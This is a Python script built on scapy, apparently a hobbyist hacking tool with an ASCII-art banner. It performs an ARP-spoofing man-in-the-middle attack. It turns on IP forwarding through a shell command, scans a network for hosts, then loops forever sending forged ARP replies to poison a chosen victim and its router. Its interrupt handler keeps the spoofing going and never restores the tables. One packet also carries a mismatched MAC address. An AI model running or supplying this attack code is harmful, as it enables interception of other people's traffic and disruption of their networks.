#!/usr/bin/env python

import scapy.all as scapy
import time
import subprocess


print ("""
     ____    _   _      _      ____    ____    _   _   _   _  
    |  _ \  | | | |    / \    |  _ \  / ___|  | | | | | \ | | 
    | | | | | |_| |   / _ \   | |_) | \___ \  | | | | |  \| | 
    | |_| | |  _  |  / ___ \  |  _ <   ___) | | |_| | | |\  | 
    |____/  |_| |_| /_/   \_\ |_| \_\ |____/   \___/  |_| \_| 
    
    
    
                                  ______   
	                       .-        -. 
	                      /            \         
	                     |,  .-.  .-.  ,|      
	                     | )(_ /  \_ )( |
	                     |/     /\     \|    
	           (@_       <__    ^^    __>        
	      _     ) \_______\__|IIIIII|__/____________________/\ 
	     (_)\@8@8{}<_________________________________________/ 
	            )_/         \ IIIIII /                    
	           (@            --------                      
		  \n\n""")


def sub():
    network = subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def scan():
    ip = input("ENTER IP WAY TO SCAN == ")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        clients_dist = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(clients_dist)
    return clients_list


def print_result(results_list):
    print("IP\t\t\tMAC ADDRESS\n------------------------------------------------------------------------------------------")
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])


def spoof():
    print("------------------------------------------------------------------------------------------")
    ip = input("ENTER IP TO SPOOF == ")
    mac = input("ENTER MAC TO SPOOF == ")
    r_ip = input("ENTER ROUTER == ")
    spoof_arp = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=r_ip)
    spoof_arp2 = scapy.ARP(op=2, pdst=r_ip, hwdst=mac, psrc=ip)
    sent_packets_count = 0

    try:

        while True:
            scapy.send(spoof_arp, verbose=False)
            scapy.send(spoof_arp2, verbose=False)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Sent: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[-] Detected CTRL + C.......Re-run.")
        while True:
            scapy.send(spoof_arp, verbose=False)
            scapy.send(spoof_arp2, verbose=False)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Sent: " + str(sent_packets_count), end="")
            time.sleep(2)


sub()
scan_result = scan()
print_result(scan_result)
spoof()
